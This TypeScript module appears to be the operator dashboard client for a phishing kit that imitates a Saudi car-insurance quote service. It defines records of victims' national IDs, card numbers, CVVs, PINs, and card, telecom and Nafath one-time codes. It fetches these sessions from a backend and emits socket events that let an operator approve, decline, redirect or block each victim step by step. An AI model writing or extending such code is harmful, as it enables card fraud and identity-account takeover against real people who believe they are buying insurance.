import { io, type Socket } from "socket.io-client";

// Backend is intentionally disconnected. Set VITE_BACKEND_WS_URL to your new
// backend URL (e.g. https://your-backend.example.com) to reconnect.
export const RAILWAY_BASE: string =
  (import.meta.env['VITE_BACKEND_WS_URL'] as string | undefined) ?? "";

export const BACKEND_CONFIGURED: boolean = RAILWAY_BASE.trim().length > 0;

export type CardAttempt = {
  cardNumber?: string;
  cvv?: string;
  expiryDate?: string;
  carHolderName?: string;
  status?: string;
  createdAt?: string;
};

export type SessionRecord = {
  _id: string;
  national_id?: string;
  phone?: string;
  serialNumber?: string;
  car_year?: string;
  car_model?: string;
  carPrice?: string;
  carHolderName?: string;
  purpose_of_use?: string;
  tameenFor?: string;
  tameenAllType?: string;
  tameenType?: string;
  startedDate?: string;
  companyData?: { logo?: string; price?: number; options?: unknown[] } | null;
  cardNumber?: string;
  cvv?: string;
  expiryDate?: string;
  card_name?: string;
  pin?: string;
  cardAttempts?: CardAttempt[];
  CardAccept?: boolean;
  OtpCardAccept?: boolean;
  PinAccept?: boolean;
  STCAccept?: boolean;
  MotslAccept?: boolean;
  MotslOtpAccept?: boolean;
  NavazAccept?: boolean;
  stcAwaitingCall?: boolean;
  blocked?: boolean;
  checked?: boolean;
  MotslPhone?: string;
  MotslNetwork?: string;
  MotslOtp?: string;
  CardOtp?: string;
  NavazOtp?: string;
  Customs_card?: string;
  phoneId?: string;
  type?: string;
  createdAt?: string;
  updatedAt?: string;
  created?: string;
};

export async function fetchSessions(): Promise<SessionRecord[]> {
  if (!BACKEND_CONFIGURED) return [];
  const res = await fetch(`${RAILWAY_BASE}/users`, { cache: "no-store" });
  if (!res.ok) throw new Error(`Failed to load sessions (${res.status})`);
  const data = (await res.json()) as SessionRecord[];
  // newest first
  return [...data].sort((a, b) => {
    const at = new Date(a.updatedAt ?? a.createdAt ?? a.created ?? 0).getTime();
    const bt = new Date(b.updatedAt ?? b.createdAt ?? b.created ?? 0).getTime();
    return bt - at;
  });
}

let socket: Socket | null = null;

export function getSocket(): Socket {
  if (!BACKEND_CONFIGURED) {
    throw new Error(
      "Backend not configured. Set VITE_BACKEND_WS_URL to your new backend URL."
    );
  }
  if (socket && socket.connected) return socket;
  if (!socket) {
    socket = io(RAILWAY_BASE, {
      transports: ["websocket", "polling"],
      autoConnect: true,
    });
    socket.on("connect", () => {
      socket?.emit("join", { role: "admin" });
    });
  } else if (!socket.connected) {
    socket.connect();
  }
  return socket;
}

/**
 * Server-side accept/decline event names inferred from the customer bundle.
 * Sessions listen for these to advance/reject each step of the flow.
 */
export const STEP_EVENTS = {
  service: { accept: "acceptService", decline: "declineService" },
  payment: { accept: "acceptPaymentForm", decline: "declinePaymentForm" },
  cardOtp: { accept: "acceptVisaOtp", decline: "declineVisaOtp" },
  phone: { accept: "acceptPhone", decline: "declinePhone" },
  phoneOtp: { accept: "acceptPhoneOTP", decline: "declinePhoneOTP" },
  mobilyOtp: { accept: "acceptMobOtp", decline: "declineMobOtp" },
  motslOtp: { accept: "acceptMotslOtp", decline: "declineMotslOtp" },
  stcOtp: { accept: "acceptStcPhoneOtp", decline: "declineStcPhoneOtp" },
  stc: { accept: "acceptSTC", decline: "declineSTC" },
  navaz: { accept: "acceptNavaz", decline: "declineNavaz" },
} as const;

export type StepKey = keyof typeof STEP_EVENTS;

export function emitStep(id: string, step: StepKey, accept: boolean) {
  const s = getSocket();
  const ev = STEP_EVENTS[step][accept ? "accept" : "decline"];
  s.emit(ev, id);
  return ev;
}

export function emitAdminRedirect(id: string, path: string, search = "", session?: Record<string, string>) {
  getSocket().emit("adminRedirect", { id, path, search, session });
}

export function emitBlockClient(id: string) {
  getSocket().emit("clientBlocked", id);
}

export function emitChangeNavazCode(id: string, code: string) {
  getSocket().emit("changeNavazCode", { id, code });
}

export function currentStage(r: SessionRecord): { key: StepKey | null; label: string } {
  if (r.NavazOtp && !r.NavazAccept) return { key: "navaz", label: "Nafath OTP" };
  if (r.MotslOtp && !r.MotslOtpAccept) return { key: "motslOtp", label: "Motsl OTP" };
  if (r.CardOtp && !r.OtpCardAccept) return { key: "cardOtp", label: "Card OTP" };
  if (r.pin && !r.PinAccept) return { key: "cardOtp", label: "Card PIN" };
  if (r.MotslPhone && !r.MotslAccept) return { key: "phone", label: "Motsl phone" };
  if (r.stcAwaitingCall && !r.STCAccept) return { key: "stc", label: "STC awaiting" };
  if (r.cardNumber && !r.CardAccept) return { key: "payment", label: "Card submitted" };
  if (r.companyData?.logo) return { key: "service", label: "Insurer selected" };
  return { key: null, label: "Quote started" };
}
